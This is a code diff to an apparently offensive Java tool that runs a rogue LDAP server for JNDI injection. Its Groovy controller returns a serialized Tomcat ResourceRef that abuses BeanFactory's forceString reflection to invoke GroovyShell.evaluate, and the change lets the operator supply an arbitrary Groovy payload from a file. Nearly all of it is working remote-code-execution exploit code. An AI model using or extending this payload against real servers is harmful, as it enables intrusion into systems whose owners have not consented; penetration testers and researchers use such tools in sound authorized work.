@@ -10,6 +10,9 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
+import java.nio.file.Files;
+import java.nio.file.Path;
+
 import static artsploit.Utilities.getBase64CommandTpl;
 import static artsploit.Utilities.serialize;
 
@@ -19,7 +22,7 @@ import static artsploit.Utilities.serialize;
  *  When bean is created on the server side, we can control its class name and setter methods,
  *   so we can leverage {@link groovy.lang.GroovyShell#evaluate} method to execute arbitrary Groovy script
  *
- * @see https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html for details
+ * @see <a href="https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html">exploitation details</a>
  *
  * Requires:
  *  Tomcat and Groovy in classpath
@@ -29,9 +32,15 @@ import static artsploit.Utilities.serialize;
 @LdapMapping(uri = { "/o=groovy" })
 public class Groovy implements LdapController {
 
-    String payload = "'${cmd}'.execute()".replace("${cmd}", getBase64CommandTpl(Config.command));
 
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
+        String groovyPayload;
+
+        if (Config.groovyPayloadPath.isEmpty()) {
+            groovyPayload = "'${cmd}'.execute()".replace("${cmd}", getBase64CommandTpl(Config.command));
+        } else {
+            groovyPayload = Files.readString(Path.of(Config.groovyPayloadPath));
+        }
 
         System.out.println("Sending LDAP ResourceRef result for " + base + " with groovy.lang.GroovyShell payload");
 
@@ -41,7 +50,7 @@ public class Groovy implements LdapController {
         //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
         ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
         ref.add(new StringRefAddr("forceString", "x=evaluate"));
-        ref.add(new StringRefAddr("x",payload));
+        ref.add(new StringRefAddr("x", groovyPayload));
 
         e.addAttribute("javaSerializedData", serialize(ref));
 
